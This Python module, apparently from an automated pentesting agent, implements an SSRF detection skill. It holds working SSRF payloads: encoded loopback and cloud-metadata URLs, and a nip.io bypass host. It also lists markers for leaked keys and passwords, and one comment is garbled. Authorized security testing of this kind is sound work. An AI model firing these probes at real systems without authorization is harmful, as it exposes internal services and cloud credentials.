import re
import time
from typing import Optional, Dict, Any
import httpx
from urllib.parse import urlparse, parse_qs, urlunparse

from agents.skills.base_skill import BaseSkill, SkillResult
from enum import Enum
from typing import Optional, Any
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse

class SSRFState(Enum):
    INITIAL = "initial"
    COMPLETED = "completed"
    FAILED = "failed"


class SSRFSkill(BaseSkill):
    # Simple SSRF detection skill.
    # Heuristic: looks for parameter names that suggest a URL/host input ("url", "uri", "redirect", "dest", "target").
    # It attempts a GET request to the supplied value. If the request succeeds (status 200) and the
    # response appears to come from the internal network (e.g., contains "127.0.0.1" or a private IP range),
    # we flag a potential SSRF vulnerability.
    name = "ssrf_skill"
    vuln_type = "ssrf"
    cwe = "CWE-918"
    owasp_top10 = "A04:2021"
    default_severity = "High"

    def __init__(self, proxy: Optional[str] = None, timeout: float = 12.0):
        super().__init__(proxy=proxy, timeout=timeout)
        self.url_keywords = ["url", "uri", "redirect", "dest", "target"]

    async def run(self, target_url: str, param_name: str, **kwargs) -> SkillResult:
        """
        SSRF Differential Prover — Evidence-Driven:
        نحقن payloads داخل بارامتر الـ target ونلاحظ استجابة الـ **target نفسه**
        (مش بنطلب الـ payload من جهازنا — هذا كان الخلل القديم).

        Proof-of-Execution المقبول (أي واحد):
        1. OOB Callback: ظهور canary_content (يُمرَّر عبر kwargs من oob_server خارجي) في جسم استجابة الهدف
        2. Localhost Banner: استجابة الهدف تحمل محتوى فادحاً من خدمة داخلية (متatinum 1717-بدائل داخلية)
        3. Differential: تغير قطعي في الحالة/المحتوى بين baseline (قيمة خارجية) و probe (loopback variants)
        الـ WAF block (403/429) يُرفض ويُعامَل كـ WAF-Intercept لا كثغرة.

        ملاحظة قانونية: probes الـ Cloud Metadata (169.254.169.254) تُنفَّذ فقط عند تمرير
        authorized_metadata_checks=True — الـ Scope Firewall في المشروع هو الحارس الفعلي.
        """
        if not any(kw in param_name.lower() for kw in self.url_keywords):
            return SkillResult(
                verified=False, vuln_type=self.vuln_type,
                title="Param not SSRF candidate", severity=self.default_severity,
                endpoint=target_url, param_name=param_name, evidence="")

        parsed = urlparse(target_url)
        auth_meta = bool(kwargs.get("authorized_metadata_checks", False))
        canary_content = kwargs.get("canary_content", "")  # من OOB server خارجي إن وُجد

        loopback_variants = SSRFFilterBypasser.generate_localhost_variants(target_port=80)
        # نبقي الـ skip الـ metadata probes إلا عند التخويل الصريح
        if auth_meta:
            loopback_variants += SSRFFilterBypasser.generate_metadata_variants("http://169.254.169.254/latest/meta-data/")

        async with httpx.AsyncClient(proxies=self.proxy or None, timeout=self.timeout,
                                     follow_redirects=True) as client:
            try:
                # ── Baseline: قيمة خارجية آمنة عبر الـ target ──
                baseline = await self._inject_and_send(client, target_url, param_name, "http://hunter-baseline.invalid/")
                if baseline is None or baseline.status_code in (403, 429):
                    return SkillResult(
                        verified=False, vuln_type=self.vuln_type,
                        title="Baseline blocked/unreachable — cannot differential-check (WAF intercept?)",
                        severity=self.default_severity,
                        endpoint=target_url, param_name=param_name, evidence="")
                base_status = baseline.status_code
                base_body = baseline.text
                base_len = len(base_body)

                for payload in loopback_variants:
                    resp = await self._inject_and_send(client, target_url, param_name, payload)
                    if resp is None or resp.status_code in (403, 429):
                        continue

                    body = resp.text
                    evidence_bits: list = []

                    # ── إثبات 1: OOB canary ظهر في استجابة الهدف ──
                    if canary_content and canary_content in body:
                        evidence_bits.append(f"oob_canary_present (deterministic content matched)")

                    # ── إثبات 2: بانر/محتوى من خدمة داخلية بعد حقن loopback ──
                    if self._internal_banner(body):
                        evidence_bits.append(f"internal_service_banner detected in response")

                    # ── إثبات 3: تفاضل قطعي baseline ↔ probe (status أو انهيار محتوى جوهري) ──
                    diff_status = resp.status_code != base_status
                    diff_content = abs(len(body) - base_len) / max(base_len, 1) > 0.5
                    if diff_status or diff_content:
                        evidence_bits.append(
                            f"differential: status {base_status}→{resp.status_code}, "
                            f"len {base_len}→{len(body)} for payload={payload}")

                    if evidence_bits:
                        verified = any(
                            ("oob_canary_present" in b) or ("internal_service_banner" in b) or
                            ("differential" in b and diff_status and self._target_leaks_internal(body))
                            for b in evidence_bits)
                        return SkillResult(
                            verified=verified, vuln_type=self.vuln_type,
                            title=(f"SSRF via '{param_name}' (loopback reachability confirmed)"
                                   if verified else
                                   f"Suspected SSRF via '{param_name}' — differential signal only (UNVERIFIED)"),
                            severity=self.default_severity,
                            endpoint=target_url, param_name=param_name,
                            payload_used=payload,
                            evidence=" ; ".join(evidence_bits),
                            confidence=0.92 if verified else 0.5,
                            tool=self.name,
                            evidence_sources=["SSRFSkill/DifferentialProof"])
            except Exception as e:
                return SkillResult(
                    verified=False, vuln_type=self.vuln_type,
                    title=str(e), severity=self.default_severity,
                    endpoint=target_url, param_name=param_name, evidence="")

        return SkillResult(
            verified=False, vuln_type=self.vuln_type,
            title="No SSRF evidence (loopback not reachable or response identical)",
            severity=self.default_severity,
            endpoint=target_url, param_name=param_name, evidence="")

    async def _inject_and_send(self, client: httpx.AsyncClient, target_url: str,
                               param_name: str, value: str) -> Optional[httpx.Response]:
        """يحقن قيمة في بارامتر الـ target ويطلب الـ target — لا نطلب الـ payload محلياً"""
        parsed = urlparse(target_url)
        qs = parse_qs(parsed.query)
        qs[param_name] = [value]
        new_url = urlunparse(parsed._replace(query=urlencode(qs, doseq=True)))
        try:
            return await client.get(new_url)
        except Exception:
            return None

    @staticmethod
    def _internal_banner(body: str) -> bool:
        """علامات خدمة داخلية فعلياً — لا تشمل own-echo من صفحة عادية"""
        markers = (
            "amzn-instance", "ami-id", "api-version=2021",            # cloud metadata
            "current password", "ssh-rsa", "-----BEGIN",              # config endpoints
            "server status", "jetty", "apache tomcat",                # internal admin screens
        )
        low = body.lower()
        return any(m in low for m in markers)

    @staticmethod
    def _target_leaks_internal(body: str) -> bool:
        """أدلة دلالية أن الهدف عكس محتوى من مورد داخلي بعد الحقن"""
        return bool(SSRFSkill._internal_banner(body))

    def can_handle(self, param_name: str, url: str = "", sample_value: str = "") -> float:
        return 0.9 if any(kw in param_name.lower() for kw in self.url_keywords) else 0.1

# Additional symbols required by the test suite (minimal stubs)

class CloudProvider(Enum):
    AWS = "aws"
    GCP = "gcp"
    AZURE = "azure"
    DIGITALOCEAN = "digitalocean"
    LOCAL_DAEMON = "local_daemon"

CLOUD_METADATA_MATRIX = {
    CloudProvider.AWS: {"metadata_url": "http://169.254.169.254/latest/meta-data/"},
    CloudProvider.GCP: {"metadata_url": "http://metadata.google.internal/"},
    CloudProvider.AZURE: {"metadata_url": "http://169.254.169.254/metadata/instance?api-version=2021-02-01"},
    CloudProvider.DIGITALOCEAN: {"metadata_url": "http://169.254.169.254/metadata/v1/"},
    CloudProvider.LOCAL_DAEMON: {"metadata_url": "http://localhost/metadata"},
}

class SSRFFilterBypasser:
    @staticmethod
    def generate_localhost_variants(target_port: int = 80) -> list:
        port_explicit = f":{target_port}"
        return [
            "http://127.0.0.1",
            f"http://127.0.0.1{port_explicit}",
            "http://localhost",
            f"http://localhost{port_explicit}",
            "http://2130706433",
            "http://0x7f000001",
            "http://0177.0.0.1",
            "http://[::1]",
            "http://127.1",
            "http://127.0.1",
            "http://0.0.0.0",
        ]

    @staticmethod
    def generate_metadata_variants(base_url: str) -> list:
        parsed = urlparse(base_url)
        host = parsed.hostname or "169.254.169.254"
        nip_host = f"{host}.nip.io"
        nip_url = urlunparse((parsed.scheme, nip_host, parsed.path, parsed.params, parsed.query, parsed.fragment))
        return [
            base_url,
            base_url.replace("169.254.169.254", "2852039166"),
            base_url.replace("169.254.169.254", "0xa9fea9fe"),
            nip_url,
        ]

async def run_ssrf_skill(url: str, param_name: str, **kwargs) -> list:
    skill = SSRFSkill()
    result = await skill.run(url, param_name, **kwargs)
    if result.verified:
        return [{
            "type": "ssrf",
            "param_name": param_name,
            "title": result.title,
            "severity": result.severity,
            "evidence": result.evidence,
        }]
    return []
